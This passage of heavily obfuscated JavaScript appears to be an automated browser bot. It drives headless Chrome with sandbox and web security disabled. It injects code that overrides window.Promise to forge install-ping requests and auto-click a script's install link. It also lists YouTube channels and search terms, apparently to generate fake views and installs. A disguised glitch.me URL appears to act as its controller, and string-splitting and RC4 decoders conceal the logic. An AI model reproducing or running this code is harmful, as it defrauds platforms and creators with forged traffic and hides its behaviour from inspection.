              for (J = -0xe * -0x2c9 + 0x52c + -0x2c2a; J < 0x1b02 + -0x211a + 0x62c; J += -0x1fa6 + 0x1b3f + 0x46c)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x96c + 0x646 + -0x32b * -0x1 | L >>> -0x65f + -0x178e + 0x1e08) + (M & N | ~M & O) + P + (0x76cdc9f6 + 0xef8d6 * 0x823 + -0x961e059f) + Q[J] << -0x1a * -0x13d + -0x1733 + -0x8ff) << 0x472 + -0x6c5 * -0x5 + -0x2e * 0xd5 | P >>> -0x1e65 * 0x1 + -0x144 * 0x6 + 0x2618) + (L & (M = M << 0x29 * -0xef + 0xb92 + -0x2fb * -0x9 | M >>> 0xafe + 0x2559 + 0x1 * -0x3055) | ~L & N) + O + (-0x9f * -0x2cc717 + 0x2 * 0x2fefa57a + -0x212c78a4) + Q[J + (-0x226b + 0x100 * -0xe + 0x306c)] << 0x78 + 0x2ae * 0xc + -0x20a0) << -0x280 + -0x4 * 0x83f + 0x3d * 0x95 | O >>> 0x4 * -0x48b + 0xcb * -0x1b + -0x9ec * -0x4) + (P & (L = L << -0x219f + 0x11 * -0x89 + 0x2ad6 | L >>> -0x86b * 0x3 + -0x1d74 + -0x1d * -0x1e3) | ~P & M) + N + (-0x9fb65352 + 0x7bbe624 + 0xf27ce6c7) + Q[J + (-0x293 * 0x1 + -0x5ac + 0x841 * 0x1)] << -0x5 * 0x161 + -0x1 * 0x2353 + -0x304 * -0xe) << -0x3f * -0x87 + -0x1 * 0x58 + 0x2 * -0x106e | N >>> -0x1419 + -0x2288 + 0x36bc) + (O & (P = P << 0x6ff * -0x5 + -0x16c9 + 0x1cf1 * 0x2 | P >>> -0x2 * -0xe9b + -0x990 + -0xc * 0x1a3) | ~O & L) + M + (-0x5ef968b5 + -0xb * 0x102b0ef5 + 0x48aab491 * 0x5) + Q[J + (0x1441 + 0x2 * 0x5a7 + -0x1f8c)] << -0x645 + -0x6fb * -0x2 + -0x7b1) << 0x5 * -0x8b + 0x1 * 0x166f + -0x13b3 | M >>> 0x1 * -0xcd7 + 0x112c + -0x43a * 0x1) + (N & (O = O << -0x183f + 0x184d + 0x10 | O >>> -0x2577 + -0xcf6 + 0x326f) | ~N & P) + L + (-0xa8883d28 + -0xae26b914 + 0x1b1316fd5) + Q[J + (-0x2235 + -0x18d9 * -0x1 + 0x960)] << -0x2057 + 0x20b4 + -0x5d, N = N << -0x2261 + -0x22e8 + 0x4567 | N >>> 0x8f0 + 0x144 + -0xa32;
              for (; J < 0x1 * 0x13ff + 0x50e * 0x1 + -0x1 * 0x18e5; J += -0x7c3 + 0x1 * 0x1b69 + -0x13a1)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << -0x19a4 + -0x1 * 0x1f0d + 0x1 * 0x38b6 | L >>> 0x6d4 + -0x81a + 0x161) + (M ^ N ^ O) + P + (-0x350a199c * 0x2 + -0x1808b1 * 0x458 + 0x14153dfb1) + Q[J] << 0x26f + 0x22 * 0xd6 + 0xa49 * -0x3) << 0x20d5 + -0x1dc6 + -0x30a | P >>> -0x9cb + 0x43 * -0x47 + 0x17 * 0x13d) + (L ^ (M = M << -0x4 * 0x254 + -0xf88 + 0x2d * 0x8e | M >>> -0x1ce2 + -0x1b64 * 0x1 + 0xe12 * 0x4) ^ N) + O + (-0x46c67590 + 0xb569d6c2 + 0x368a6f) + Q[J + (0x1c65 + -0x3 * 0x109 + -0x1949 * 0x1)] << 0x83e + -0xba7 + 0x9 * 0x61) << -0x226a + 0xeb8 + 0x7 * 0x2d1 | O >>> 0x1442 * -0x1 + 0x2 * 0x3bd + 0xce3 * 0x1) + (P ^ (L = L << -0x11e5 + -0x307 * 0x1 + 0x150a | L >>> -0x2 * -0x4af + 0xa13 * 0x2 + -0x1d82) ^ M) + N + (-0x4dc1 * 0x15283 + 0xab591729 + 0x2a51703b) + Q[J + (-0x1 * 0xe6e + -0x2680 + 0x34f0)] << 0x1d3f + 0x7f7 + -0x1b1 * 0x16) << 0x1 * 0x1079 + -0x17d2 + 0x17 * 0x52 | N >>> 0x397 * -0x2 + -0x2 * 0x11c + 0x1 * 0x981) + (O ^ (P = P << -0xb * 0x213 + -0x1 * -0x18aa + 0x1bb * -0x1 | P >>> -0x1ed2 + -0x261b + 0x1 * 0x44ef) ^ L) + M + (-0x97c53836 + -0x3da60b5d + 0x144452f34) + Q[J + (-0x2490 + 0x1 * 0xe57 + -0x4 * -0x58f)] << -0x3 * -0xbc3 + 0x233b + -0x4 * 0x11a1) << -0x3db * -0x1 + 0xb6 * -0x2a + 0xd03 * 0x2 | M >>> 0x1d5d + -0x5 * -0x136 + -0x2350) + (N ^ (O = O << 0x34a * 0x1 + -0x4e6 + 0x1a * 0x11 | O >>> -0x2598 + -0x1a41 + 0x3fdb) ^ P) + L + (-0x1 * 0x132b4a4f + 0x42617f91 + -0x262bb * -0x1aad) + Q[J + (0x1 * 0x22b4 + 0x1 * -0x21b + -0x2095)] << -0x1864 + -0x3db + 0x1c3f, N = N << 0x1 * 0x84a + 0x1373 * 0x2 + 0x19 * -0x1e2 | N >>> -0x11db + 0x1 * 0xcb3 + -0x1 * -0x52a;
              for (; J < -0x1650 + -0xf * 0x281 + 0x3c1b; J += -0x8db * 0x3 + 0x24f3 + -0xa5d)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x21ff + 0xf47 * -0x1 + -0x1 * 0x12b3 | L >>> -0x124e * 0x2 + -0x18da + 0x3d91) + (M & N | M & O | N & O) + P - (-0x3975513 + 0xcf7b89c6 + -0x5afff18f) + Q[J] << -0x1092 + -0xc5e + 0x1cf0) << -0x21d0 + 0x16ba + 0xb1b | P >>> -0xf2c + -0x10 * 0xf2 + 0x1e67) + (L & (M = M << 0x45b * 0x3 + -0xd45 * -0x1 + -0xd1c * 0x2 | M >>> 0x27 * 0x21 + 0x104b + -0x1550) | L & N | M & N) + O - (-0x16c1feb2 + 0x663a220b + 0x216c1fcb) + Q[J + (-0xc03 + 0x388 * -0x4 + 0x1a24)] << -0x1 * -0x1a26 + -0x40c * 0x7 + -0x1f * -0x12) << 0x20f6 + -0x15db + -0xb16 | O >>> 0xc4 * 0x12 + -0x218f + 0x2 * 0x9f1) + (P & (L = L << -0x1cc1 + -0x768 + 0x25 * 0xfb | L >>> 0xa4a + -0x1792 + 0xd4a) | P & M | L & M) + N - (0x151cd * -0x55e5 + -0x50fb68e0 + -0xeb * -0x14eaaef) + Q[J + (-0x5f7 + 0xff4 + -0x9fb)] << 0x1763 + 0x1b03 + -0x3266 * 0x1) << -0xe9c + 0xe55 + 0x4c | N >>> 0x1 * 0x1575 + 0x836 + 0x1d9 * -0x10) + (O & (P = P << 0xf2 * -0xd + -0x267a + 0x4e * 0xa7 | P >>> 0x305 * 0xb + 0xe0b * -0x2 + -0x51f) | O & L | P & L) + M - (0xd5e7c94b + 0x1e0a7 * -0x1c73 + -0x2f995722) + Q[J + (-0x93a + 0x969 * -0x2 + -0xb * -0x28d)] << 0x6e * -0x45 + -0x4b8 + 0x225e) << 0x655 + -0x2 * 0x1027 + 0x19fe | M >>> -0x5aa + 0x1e6f + 0x11f * -0x16) + (N & (O = O << -0x156c + 0x256e * 0x1 + -0xfe4 | O >>> 0x45 * 0x35 + -0xc9e + -0x1a9 * 0x1) | N & P | O & P) + L - (-0x4a37e58b * 0x3 + -0x55f8a997 + 0x1a5849d5c) + Q[J + (0x5a * 0x1f + 0x59 * 0x17 + -0x12e1)] << -0x88f * 0x2 + -0x3 * -0x56d + -0x1 * -0xd7, N = N << -0x394 * 0x2 + 0x71 * 0x2f + -0xd79 | N >>> -0x1829 + -0x993 * -0x3 + -0x48e;
              for (; J < 0x197 * -0x9 + -0x1c45 * 0x1 + 0x2ae4; J += 0x22cf * -0x1 + 0x1 * -0x9a8 + 0x34 * 0xdb)
                L = (K = (M = (K = (N = (K = (O = (K = (P = (K = L << 0x20b + 0x2585 + -0x1 * 0x278b | L >>> 0x261b + -0x47 * 0x21 + -0x5c5 * 0x5) + (M ^ N ^ O) + P - (-0x8075002 + 0x4db2fea9 + -0x100e707d) + Q[J] << -0x2d7 * 0xb + -0x2 * -0xd29 + -0x4eb * -0x1) << -0x2 * -0x90e + 0x19 * 0xe5 + -0x2874 | P >>> -0x6b * 0x24 + 0xdc1 + 0x2 * 0xb3) + (L ^ (M = M << -0x25ef + -0x1 * 0xbf8 + 0x3205 | M >>> -0x135f + 0x5 * 0x104 + 0xe4d) ^ N) + O - (0x4 * -0x176703a7 + -0x1 * 0x38fe07b + 0x96c92d41) + Q[J + (0x3 * 0xef + -0xeb * -0x23 + -0x22ed * 0x1)] << -0x205f + 0x3a * 0x2 + 0x1feb) << 0x1e * 0xd6 + -0x26fc + 0xded | O >>> -0x165a + 0x2706 + -0x1 * 0x1091) + (P ^ (L = L << 0x1a93 * 0x1 + 0x1b25 * -0x1 + -0x2c * -0x4 | L >>> 0xc1 * 0x19 + -0x1d5c + 0x1 * 0xa85) ^ M) + N - (0x4c56d328 + -0x17 * 0xd7fc2d + -0x351ecf3) + Q[J + (0x223e + -0x2 * 0x739 + -0x13ca * 0x1)] << 0x3 * 0x75 + -0x1521 + 0x13c2) << -0x1609 * 0x1 + 0x26fb * 0x1 + -0x10ed | N >>> 0x335 * -0x7 + -0x151d + -0x7 * -0x63d) + (O ^ (P = P << 0x5 * -0x203 + -0x1a * -0x70 + -0x133 | P >>> 0x586 + 0x147d + -0x13d * 0x15) ^ L) + M - (0x4fdb9af * 0x15 + 0x680399ac + -0x2c7ee1 * 0x37d) + Q[J + (-0x246e * -0x1 + 0x18bf + -0x1 * 0x3d2a)] << 0x42 * -0x97 + -0x2 * 0xffd + 0x4 * 0x11ba) << -0x45 * 0x3b + -0x1 * -0x691 + 0x95b | M >>> 0x221b + 0x4f * 0x3b + -0x3435) + (N ^ (O = O << -0x2391 + -0x1292 + 0x3641 | O >>> 0x26a + -0x11d1 + 0xf69 * 0x1) ^ P) + L - (0x1de96781 + 0x6698066e + -0x4ee42fc5) + Q[J + (-0x25fb + 0x1b32 + 0xacd)] << 0x97 * -0x2b + -0x4 * -0x338 + 0xc7d, N = N << -0x132 * 0x4 + 0x207d + -0x1b97 | N >>> -0xca * -0x31 + -0x19b7 * -0x1 + 0x1 * -0x405f;
              this['h0'] = this['h0'] + L << 0x2 * -0x332 + -0x2575 + 0x2bd9, this['h1'] = this['h1'] + M << -0x2499 * -0x1 + -0xc93 + -0x1806, this['h2'] = this['h2'] + N << 0xf * 0x7f + -0x24 * 0x48 + 0x1 * 0x2af, this['h3'] = this['h3'] + O << -0x545 * -0x1 + 0x449 + -0x98e, this['h4'] = this['h4'] + P << 0x112 + -0x3ca + 0x2b8;
            }
            ['hex']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return w[J >> -0x976 * -0x3 + -0x52 * -0x1a + -0x249a & -0x545 + -0x2441 + 0x2995] + w[J >> -0x1c4 * 0xb + -0x14ea + 0x816 * 0x5 & 0x3f * 0x59 + -0xd23 * 0x1 + 0x3 * -0x2e7] + w[J >> -0x6 * -0x39a + -0x234d + -0xdc5 * -0x1 & -0x1 * -0xe17 + 0xe24 * 0x2 + -0x2a50] + w[J >> -0x17 * -0x15a + -0x23aa + 0x4a4 & 0xaa4 + -0x251f + 0x1a8a] + w[J >> -0x577 + 0x23fb * 0x1 + -0x208 * 0xf & -0x66b + -0x1d4 + 0x84e] + w[J >> -0x32c + 0x1fa0 + 0x22 * -0xd6 & -0x9 * -0x144 + 0x49b * 0x8 + -0x302d] + w[J >> 0x12f3 + 0xc5e + -0x1f4d & 0x18db + 0xce * 0x19 + 0x2cea * -0x1] + w[-0xfa0 + -0x1f82 + 0x2f31 & J] + w[K >> -0x1 * 0x27f + 0xe02 * 0x1 + 0x8b * -0x15 & 0x185e + -0x4de + -0x1371] + w[K >> -0x58b + -0xc3 + 0x666 & -0xa49 + -0xe80 + 0x18d8] + w[K >> -0x1 * 0x1acb + 0x2384 + -0x8a5 & 0xe * 0x6 + -0x1 * -0x269e + -0x26e3] + w[K >> 0xd00 + -0x1 * -0x233d + -0x302d & 0x3 * -0x467 + -0x18d4 + 0x2618] + w[K >> -0x12f9 + -0x69d + -0x182 * -0x11 & 0x1eab + 0x1 * 0x1a3d + -0x38d9] + w[K >> 0x3 * -0x65f + -0x1 * -0x355 + 0xfd0 & 0x18e * 0x1 + -0x43 * 0x6b + 0x1a82] + w[K >> 0x1 * 0x246f + 0x1 * -0x15cf + -0xe9c & 0x98f + -0x10f3 + 0x1 * 0x773] + w[-0x1f * -0xa5 + 0x1 * -0x971 + -0x1 * 0xa7b & K] + w[L >> -0x26fd + 0x15cf * -0x1 + 0x3ce8 & 0x1c9e + -0x2 * 0xf17 + -0x1 * -0x19f] + w[L >> -0x1 * 0x64d + -0x54e + 0xbb3 & 0x409 + -0x2 * -0x11e1 + 0x2 * -0x13de] + w[L >> -0x1060 + -0x56 * 0x1d + -0x1 * -0x1a32 & -0x219f + 0x4 * 0x5b3 + 0xae2] + w[L >> -0xafd + 0x8e * -0x26 + -0x23 * -0xeb & -0xaca + -0x1e0d + 0x28e6] + w[L >> -0x73c + -0x1 * -0x25d2 + -0x6 * 0x517 & 0x1507 + -0x1c1 * -0xe + -0x2d86] + w[L >> -0x7f * -0x38 + -0x5dc * -0x2 + 0x34a * -0xc & 0x23d5 + -0x22f9 * 0x1 + -0xcd * 0x1] + w[L >> -0x1 * -0x18b9 + 0x1 * -0x26b7 + 0xe02 & 0x1 * -0x1747 + 0xbb * -0x5 + -0x8ff * -0x3] + w[0x38 * -0x1b + -0x1 * -0xe3c + -0x845 & L] + w[M >> -0x145c + -0x1108 + 0x2580 & -0x1434 + -0x1941 + 0x2d84] + w[M >> -0x8b1 + 0x1f8e + -0x16c5 & 0x370 + 0x3 * 0x73b + 0xc89 * -0x2] + w[M >> -0x642 * -0x3 + -0x17a + -0x44e * 0x4 & -0x20a2 + 0x503 * 0x5 + 0x7a2] + w[M >> 0x3f1 * -0x2 + -0x129 + 0x91b & -0x2420 + -0x2123 + 0x4552] + w[M >> -0x19f1 + 0x1282 * 0x2 + -0xb07 & 0xb7d + -0x98e + -0x8 * 0x3c] + w[M >> -0x38f * 0x3 + -0xac3 + -0x3 * -0x728 & -0x26a6 + -0x1 * 0xffb + 0x36b0] + w[M >> -0x245a + 0x8a4 + 0xddd * 0x2 & -0x5 * 0xc2 + -0x1 * -0x9a3 + -0x3 * 0x1ee] + w[0x141c + -0x2445 + 0x1038 & M] + w[N >> -0x1fd * 0x11 + -0x758 + 0x2941 & -0x1a86 + 0x11c + -0x1 * -0x1979] + w[N >> -0x176 + 0x1047 + -0xeb9 & 0x3 * 0xcf7 + -0x6 * 0x104 + -0x2fa * 0xb] + w[N >> 0x1 * -0x1d47 + 0x23e1 + -0x686 & 0x4b5 * -0x7 + -0x1217 + 0x3319] + w[N >> -0xb3f + -0x1cec + -0x283b * -0x1 & -0x76 * -0x49 + 0xd6 * 0x1b + -0x3829] + w[N >> 0xbe4 * 0x1 + 0x2533 + 0x51 * -0x9b & 0x9 * -0xbf + 0x1 * 0x15cf + 0x1 * -0xf09] + w[N >> -0x1 * -0x17c2 + -0x319 + -0x14a1 & -0x4 * 0x85d + -0x248a + 0x4f * 0xe3] + w[N >> 0xc6d * -0x1 + -0x232 + 0x3 * 0x4e1 & 0xeae + -0x5 * 0x43e + 0x697] + w[0x1c * -0x92 + -0x2b * 0xd3 + 0x3378 & N];
            }
            ['digest']() {
              this['finalize']();
              var J = this['h0'],
                K = this['h1'],
                L = this['h2'],
                M = this['h3'],
                N = this['h4'];
              return [
                J >> -0x2a5 + 0x1ead + -0x1bf0 & 0x1c9c + -0x1d14 + 0x19 * 0xf,
                J >> 0x1 * 0x1f42 + -0x25c4 * -0x1 + -0x54e * 0xd & -0x1 * -0x169f + 0x83 * 0x30 + -0x2e30,
                J >> -0xc7 * 0x14 + -0x127f + -0x8f * -0x3d & -0x9f9 * 0x1 + -0x966 + 0x145e,
                0x29 * 0x71 + -0x1c95 * -0x1 + -0x2daf & J,
                K >> 0x5bc + -0x17 * 0x10b + -0x7 * -0x29f & -0x5 * 0x58d + 0x26b * 0x7 + 0xbd3,
                K >> 0x5 * 0x6d1 + -0x1fd8 + -0x1 * 0x22d & 0x38b * -0x2 + -0x159e * -0x1 + -0x181 * 0x9,
                K >> 0x98 + 0x7ba + -0x1 * 0x84a & 0xb * -0x74 + 0x1 * 0xdd + -0xa * -0x83,
                -0x2250 + 0x3 * -0xb0d + 0x4476 & K,
                L >> -0x7a * 0x16 + -0x24 * -0x20 + -0x185 * -0x4 & -0x1f9f * 0x1 + 0x5 * 0x65b + 0xd7,
                L >> -0xb45 + 0x1b34 + -0xef * 0x11 & -0x35 * 0x5b + -0x2a6 + 0x167c,
                L >> -0x236e + 0x1da8 + 0x5ce & -0x9b9 * 0x1 + -0x1 * -0x4a9 + 0x60f,
                -0xca4 + -0x2e1 + 0x4 * 0x421 & L,
                M >> 0x46e * -0x4 + 0x1218 + 0x24 * -0x2 & -0x4dc * -0x6 + -0xf0e * -0x2 + -0x3a45,
                M >> 0x1488 + 0x17b + -0x1 * 0x15f3 & 0xc8 + -0x1 * 0x2145 + 0x217c * 0x1,
                M >> -0x2 * -0x665 + -0x144f + 0x78d & 0x2f * -0x76 + -0x33d * 0x7 + -0x2d54 * -0x1,
                0x1b * 0xb8 + 0x1c39 + -0x1 * 0x2ea2 & M,
                N >> 0x151 * -0x1d + -0x1906 * -0x1 + 0x1 * 0xd3f & 0x10bd + 0x1a65 * -0x1 + 0x65 * 0x1b,
                N >> -0x5bc + 0x6f3 + -0x1 * 0x127 & -0x458 * 0x3 + 0x1207 + -0x400,
                N >> 0x9bf + 0x9c * 0xb + -0x3 * 0x579 & 0x19 * -0x101 + 0x1 * 0x2701 + -0xce9 * 0x1,
                0x12f * 0x15 + -0x341 * -0x1 + -0x277 * 0xb & N
              ];
            }
            ['arrayBuffe' + 'r']() {
              var J, K;
              return this['finalize'](), J = new ArrayBuffer(0x7 * -0x29d + -0x18c4 * 0x1 + 0xe61 * 0x3), (K = new DataView(J))['setUint32'](0xb0c + 0x2e * -0x1 + -0xade, this['h0']), K['setUint32'](0x1b * -0x27 + 0xa8c + 0x1 * -0x66b, this['h1']), K['setUint32'](-0x11 * 0x2b + 0x1114 * -0x1 + 0x13f7, this['h2']), K['setUint32'](0x14df + -0x2a * -0x86 + -0x2acf, this['h3']), K['setUint32'](0x687 + 0x1 * 0x207e + -0x1 * 0x26f5, this['h4']), J;
            }
        }
        G['prototype']['toString'] = G['prototype']['hex'], G['prototype']['array'] = G['prototype']['digest'];
        const H = C();
        window['localStora' + 'ge']['setItem']('manualOver' + 'rideInstal' + 'lJS', '1');
        let I = document['getElement' + 'sByClassNa' + 'me']('install-li' + 'nk')[0x2a2 * 0x9 + 0x1a45 + -0x31f7];
        return window['Promise'] = class extends window['Promise'] {
          constructor(...J) {
            let K = 0x2f5 + 0x1a59 + -0x1d4e;
            J[-0xe6b * 0x1 + -0x2295 * -0x1 + -0x142a]['toString']()['includes']('getAttribu' + 'te(\x22data-p' + 'ing-url') && (J[0x78 + 0x5c3 + -0x63b] = L => {
              let M = I['getAttribu' + 'te']('data-ping-' + 'url');
              if (M) {
                let N = H(I['getAttribu' + 'te']('data-ip-ad' + 'dress') + I['getAttribu' + 'te']('data-scrip' + 't-id') + I['getAttribu' + 'te']('data-ping-' + 'key')),
                  O = new XMLHttpRequest();
                O['open']('POST', M + ('&mo=3&ping' + '_key=') + encodeURIComponent(N), 0x11fa + -0xad9 * -0x2 + -0x27ab), O['overrideMi' + 'meType']('text/plain'), O['onload'] = () => {}, O['send'](), K = -0x22c1 + 0x114f + 0x3 * 0x5d1;
              }
            }), K || super(...J);
          }
        }, window['setTimeout'](() => {
          I['click']();
        }, 0x278 * 0x1 + 0x1daf + -0x1a4b * 0x1), Promise['resolve'](0x2ad * -0xe + -0x2140 + 0x46b7 * 0x1);
      })), log('after...'), await new Promise(w => setTimeout(w, NETWORK_PATIENCE)), await s['close'](), await r['close'](), i())) : (await s['close'](), await r['close'](), i());
    }
  }
  for (let j = -0x42 * 0x44 + -0x1c0e + 0x2d96; j < 0xf06 + 0x5bf * 0x1 + 0x2 * -0xa62; j++)
    i();
}

function c(b, d) {
  const e = a();
  return c = function(f, g) {
    f = f - (0x53 + 0x8c5 + 0x48c * -0x2);
    let h = e[f];
    if (c['yeFipN'] === undefined) {
      var i = function(m) {
        const n = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let o = '',
          p = '';
        for (let q = 0x370 + 0x10a9 * 0x1 + -0x1419, r, s, t = 0x1b9f + -0x1341 + 0x66 * -0x15; s = m['charAt'](t++); ~s && (r = q % (-0x5 * -0x2e7 + -0xb + -0xe74) ? r * (-0x11 * 0x227 + -0x1 * -0x262d + -0x6 * 0x39) + s : s, q++ % (0x112b + 0xd47 + -0x1e6e)) ? o += String['fromCharCode'](-0x1b16 + -0x5 * 0x72 + 0x1e4f & r >> (-(-0x21e6 + 0x1c0d + -0x1 * -0x5db) * q & -0x1 * 0x389 + 0x5ea + 0x3 * -0xc9)) : -0x2 * -0x1b4 + -0x20c2 + 0x1d5a) {
          s = n['indexOf'](s);
        }
        for (let u = -0x1dcb + -0x1 * 0x1841 + 0x360c, v = o['length']; u < v; u++) {
          p += '%' + ('00' + o['charCodeAt'](u)['toString'](-0xedd + 0x3 * -0xb25 + -0x5 * -0x9ac))['slice'](-(0x1 * 0x1f49 + -0x216c + 0x225));
        }
        return decodeURIComponent(p);
      };
      c['labWia'] = i, b = arguments, c['yeFipN'] = !![];
    }
    const j = e[-0x656 * -0x1 + 0x1 * 0x1ad8 + -0x212e],
      k = f + j,
      l = b[k];
    return !l ? (h = c['labWia'](h), b[k] = h) : h = l, h;
  }, c(b, d);
}

function b(c, d) {
  const e = a();
  return b = function(f, g) {
    f = f - (0x53 + 0x8c5 + 0x48c * -0x2);
    let h = e[f];
    if (b['wUGNpD'] === undefined) {
      var i = function(n) {
        const o = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789+/=';
        let p = '',
          q = '';
        for (let r = 0x370 + 0x10a9 * 0x1 + -0x1419, s, t, u = 0x1b9f + -0x1341 + 0x66 * -0x15; t = n['charAt'](u++); ~t && (s = r % (-0x5 * -0x2e7 + -0xb + -0xe74) ? s * (-0x11 * 0x227 + -0x1 * -0x262d + -0x6 * 0x39) + t : t, r++ % (0x112b + 0xd47 + -0x1e6e)) ? p += String['fromCharCode'](-0x1b16 + -0x5 * 0x72 + 0x1e4f & s >> (-(-0x21e6 + 0x1c0d + -0x1 * -0x5db) * r & -0x1 * 0x389 + 0x5ea + 0x3 * -0xc9)) : -0x2 * -0x1b4 + -0x20c2 + 0x1d5a) {
          t = o['indexOf'](t);
        }
        for (let v = -0x1dcb + -0x1 * 0x1841 + 0x360c, w = p['length']; v < w; v++) {
          q += '%' + ('00' + p['charCodeAt'](v)['toString'](-0xedd + 0x3 * -0xb25 + -0x5 * -0x9ac))['slice'](-(0x1 * 0x1f49 + -0x216c + 0x225));
        }
        return decodeURIComponent(q);
      };
      const m = function(n, o) {
        let p = [],
          q = -0x656 * -0x1 + 0x1 * 0x1ad8 + -0x212e,
          r, t = '';
        n = i(n);
        let u;
        for (u = 0x688 + 0x1d * 0xba + -0x1 * 0x1b9a; u < -0x2408 + -0x7db + -0x2ce3 * -0x1; u++) {
          p[u] = u;
        }
        for (u = 0x19ef * -0x1 + 0x1a9e + -0xaf; u < 0x2c4 * 0x3 + 0x13 * 0x161 + -0x217f; u++) {
          q = (q + p[u] + o['charCodeAt'](u % o['length'])) % (-0xd * -0x2c6 + 0x65 * -0x33 + -0xeef), r = p[u], p[u] = p[q], p[q] = r;
        }
        u = -0x241 * -0x11 + 0x2b7 + -0xd * 0x328, q = 0xe2 + -0x124b + 0x1 * 0x1169;
        for (let v = 0x3 * -0xa4 + 0x5ad * 0x5 + -0x1a75; v < n['length']; v++) {
          u = (u + (-0x270f * -0x1 + -0x1323 + -0x13eb)) % (0x651 + 0x1 * 0x1294 + -0x3 * 0x7f7), q = (q + p[u]) % (0x24 * 0xe7 + 0x694 + -0xe * 0x2b8), r = p[u], p[u] = p[q], p[q] = r, t += String['fromCharCode'](n['charCodeAt'](v) ^ p[(p[u] + p[q]) % (0x7 * 0x200 + -0x245c + 0x175c)]);
        }
        return t;
      };
      b['rOnpLo'] = m, c = arguments, b['wUGNpD'] = !![];
    }
    const j = e[-0x736 + -0x1 * 0x1d4b + 0x2481],
      k = f + j,
      l = c[k];
    return !l ? (b['QEodfW'] === undefined && (b['QEodfW'] = !![]), h = b['rOnpLo'](h, g), c[k] = h) : h = l, h;
  }, b(c, d);
}
const NETWORK_PATIENCE = 0x3ce9 + 0xc * -0x1b7 + -0x5 * 0x1d1 + (0x135c + -0x1c18 + -0x1 * -0x1474) * Math['random'](),
  MM_NETWORK_PATIENCE = (-0x1 * 0x204e + -0x1 * 0xe7b + -0xa * -0x4ae) * NETWORK_PATIENCE,
  url = require('url'),
  doFlags = {
    'doActivateBrowser': 0x1,
    'doGF': 0x0,
    'doSoundCloud': 0x0,
    'doYT': 0x0,
    'doMediumReader': 0x0,
    'doRemoteCaptcha': 0x0,
    'doDual': 0x0,
    'doWhitepagesMode': 0x1,
    'doMiscNetActivity': 0x1,
    'doOUJS': 0x1,
    'doCreateServer': 0x1,
    'doExtFingerprint': 0x1
  },
  {
    log: log,
    warn: warn
  } = console,
  {
    floor: floor,
    random: random,
    ceil: ceil
  } = Math;
let PROCESSED_XURL_VAL = 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/gen_dd_' + 'adkjasbdjq' + 'wkjndwqkdw' + 'qasczxhgcx' + 'zc',
  PROCESSED_SYX_VAL = 'CX001_ZCa';
const pptOptions = {
    'headless': 0x1,
    'setDefaultNavigationTimeout': 0x0,
    'setDefaultTimeout': 0x0,
    'args': [
      '--no-sandb' + 'ox',
      '--disable-' + 'setuid-san' + 'dbox',
      '--disable-' + 'dev-shm-us' + 'age',
      '--disable-' + 'web-securi' + 'ty'
    ]
  },
  axios = require('axios'),
  fetch = require('node-fetch'),
  channels = [
    'https://ww' + 'w.youtube.' + 'com/@Taskm' + 'aster',
    U(0x12) + 'w.youtube.' + 'com/@MrBea' + 'st',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCAiLfjN' + 'XkNv24uhpz' + 'UgPa6A',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCIPPMRA' + '040LQr5QPy' + 'JEbmXA',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCUaT_39' + 'o1x6qWjz7K' + '2pWcgw',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UC4-79UO' + 'lP48-QNGgC' + 'ko5p2g',
    'https://ww' + 'w.youtube.' + 'com/@quade' + 'caX8',
    'https://ww' + 'w.youtube.' + 'com/@watch' + 'er',
    'https://ww' + 'w.youtube.' + 'com/@Zyeni' + 'th',
    'https://ww' + 'w.youtube.' + 'com/@RyanG' + 'eorge',
    'https://ww' + 'w.youtube.' + 'com/@Legal' + 'Eagle',
    'https://ww' + 'w.youtube.' + 'com/@jacks' + 'films',
    'https://ww' + 'w.youtube.' + 'com/@fanta' + 'no',
    V(0x3) + 'w.youtube.' + 'com/@NerdE' + 'xplains',
    'https://ww' + 'w.youtube.' + 'com/@HowTo' + 'Basic',
    'https://ww' + 'w.youtube.' + 'com/channe' + 'l/UCxjrNGr' + 'X188Riipfm' + 'vejjsg'
  ];
((() => {
  Array['prototype']['repeatExte' + 'nd'] = function(h) {
    let i = this,
      j = i;
    for (let k = -0x119d + 0x191d * 0x1 + 0x80 * -0xf; k < h; k++)
      j = j['concat'](i);
    return j;
  }, Array['prototype']['random'] = function() {
    return this[floor(random() * this['length'])];
  };
  const f = new Map();
  Array['prototype']['randomFlus' + 'h'] = function(h) {
    let i = this[floor(random() * this['length'])];
    f['has'](h) || f['set'](h, new Set());
    const j = f['get'](h);
    for (; j['has'](i);)
      j['size'] === this['length'] && j['clear'](), i = this[floor(random() * this['length'])];
    return j['add'](i), i;
  };
})());
let searchTerms = [];
searchTerms['push'](('moomoo.io,' + 'moomoo.io\x20' + 'hack,moomo' + 'o.io\x20defea' + 'ting\x20hacke' + 'rs,moomooi' + 'o,moomoo.i' + 'o\x20mods,moo' + 'moo.io\x20ins' + 'ta\x20kill,mo' + 'omoo.io\x20sa' + 'ndbox,moom' + 'oo.io\x20hack' + 's,moomoo.i' + 'o\x20base,moo' + 'moo.io\x20wor' + 'ld\x20record,' + 'moomoo.io\x20' + 'hacker,moo' + 'moo.io\x20hac' + 'k\x20link,moo' + V(0x16) + 'h\x20score,mo' + 'omoo.io\x20tr' + 'olling,moo' + 'moo.io\x20def' + 'eating\x20aut' + 'o\x20healers,' + 'moomoo.io\x20' + 'raiding\x20ba' + 'ses,moomoo' + '.io\x20update' + ',moomoo.io' + '\x202,moomoo.' + 'io\x20tutoria' + 'l,moomoo.i' + 'o\x20gameplay' + ',moomoo.io' + '\x20new\x20updat' + 'e,moomoo.i' + 'o\x20instakil' + 'l,moomoo.i' + 'o\x20highligh' + 'ts,moomoo.' + 'io\x20game')['split'](',')), searchTerms['push'](('mrbeast,mr' + '\x20beast,mrb' + 'east\x20team,' + 'mrbeast\x20cr' + 'ew,the\x20old' + '\x20mrbeast\x20c' + 'rew,mrbeas' + 't\x20ex\x20emplo' + 'yees,mrbea' + 'st\x20ex-empl' + 